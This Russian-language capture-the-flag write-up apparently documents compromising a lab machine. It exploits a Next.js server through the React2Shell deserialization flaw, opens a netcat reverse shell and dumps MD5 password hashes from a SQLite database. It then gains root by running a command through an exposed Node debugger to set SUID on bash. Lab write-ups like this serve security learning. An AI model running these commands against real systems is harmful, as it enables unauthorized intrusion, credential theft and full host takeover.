Сегодня будем решать такую вот таску

<img width="2560" height="1336" alt="{A9188F8B-099D-4FEF-B711-2F12598EE136}" src="https://github.com/user-attachments/assets/e6199148-5d4a-4623-957a-17bef0ef3f22" />

Первое что я хотел бы сделать так это просканировать порты 

сначала просканирую сайт с помощью nmap -T5 -p- 10.129.245.214
вижу открытые порты - 22,3000

дальше решил просканировать подробнее порт что бы узнать что это

nmap -T5 -p3000 -sVC 10.129.245.214
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 19:13 EDT
Nmap scan report for 10.129.245.214
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Wed, 09 Sep 2026 23:13:32 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 09 Sep 2026 23:13:32 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close

Вижу что висит Next.js, захожу туда и вижу вот ето...

<img width="2560" height="1440" alt="{37A65D13-0159-4192-8F21-D0428A64E6FD}" src="https://github.com/user-attachments/assets/8d805e3d-055a-42da-bb94-44b905c5f2ab" />

Вообщем попытался погуглить название системы и поискать cve но ничего не нашел, так же пытался профаззить директории но так же ничего не нашел думал продолжить поиск 
но пришел к мысли о том что бы посмотреть какие последние уязвимости есть у Next.js на котором как раз висит приложение , ну наткнулся на известный React2Shell - CVE-2025-66478  
перед поиском експлоита я решаюсь посмотреть что же вообще такое CVE-2025-66478 и как он используется. Так, ну что, если коротко - эта уязвимость которая дает нам RCE без аутентификации - CVSS 10.0
по факту это дубликат CVE-2025-55182 просто зарегали ее дважды, из-за чего кстати на NVD ее пометили как Rejected 

# React2Shell CVE-2025-55182/CVE-2025-66478

Как же работает React2Shell?
1. Мы формируем наш вредоносный HTTP запрос - уязвимость заключается в том, как протокол React Server Components десериализует пользовательский ввод на сервер
2. Проблема в том что сервер не валидирует структуру пейлоада - после того как мы отправили наш запрос, Next.js передаёт пейлоад в свой React Server Components, который использует логику декодирования React для его десериализации, поскольку этот процесс раскрывает свойства объектов без должной валидации, вредоносный пейлоад может внедрить загрязняющие прототип ключи - такие как "__proto__" или "constructor"
3. Атака на прототипную цепочку JavaScript, через специальные ключи атакующий модифицирует базовые объекты Node.js и в итоге заставляет сервер выполнить произвольный js код с привилегиями серверного процесса


Теперь мы можем поискать готовый poc на github, сделаю это через гугл дорк так как это будет удобнее site:github.com React2Shell-poc
находим https://github.com/whiteov3rflow/CVE-2025-55182-poc, перед проверкой любого готового poc стоит посмотреть на его исходный код, на проверку бэкдора или еще каких то гадостей
проверил, ничего нету уязвимого, приступаем к експлутации 
python3 exploit.py "busybox nc IP 4444 -e sh"  http://10.129.245.214:3000
node@reactor:/opt/reactor-app$ id
id
uid=999(node) gid=988(node) groups=988(node)
node@reactor:/opt/reactor-app$ 
мы получили rce


# Повышение привилегий до engineer

node@reactor:/opt/reactor-app$ cat .env
cat .env

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
NODE_ENV=production

# sqlite3
вижу sqlite3 решаю зайти туда и посмотреть какие .tables есть 

sqlite> .tables

sensor_logs  users      

sqlite> select * from users

   ...> ;
   
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb

2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

sqlite> 

круто, это md5, перед взломом через john/hashcat я реши зайти на сайт https://hashes.com/ и декриптнуть его там

39d97110eafe2a9a68639812cd271e8e:reactor1


<img width="1173" height="482" alt="{FC0B56A9-8AC2-489F-919F-D5A1D6FBA1A3}" src="https://github.com/user-attachments/assets/e3805edd-d470-455e-a7a5-e1aabbc87177" />

воуля, мы зашли, но это не конец, надо продолжать путь повышения привилегий, но перед этим прочитаю флаг
engineer@reactor:~$ ls 
user.txt
engineer@reactor:~$ cat user.txt 
???????????????????????????????????

# Повышение привилегий до root
engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)

я пытался получить рута от lxd но все было безуспешно, так как его на самом деле там и нет(
вообщем попробую linpeas.sh
по итогу я нашел процесс который запущен от root 1419  0.0  1.2 1066836 47892 ?       Ssl  Sep09   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
подключился engineer@reactor:/opt/uptime-monitor$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash')")
Uint8Array(0)
debug> .exit

engineer@reactor:/opt/uptime-monitor$ ls -la /bin/bash

-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash

engineer@reactor:/opt/uptime-monitor$ /bin/bash -p

bash-5.2# id

uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)

bash-5.2# cat /root/root.txt

?????????????????????????????????



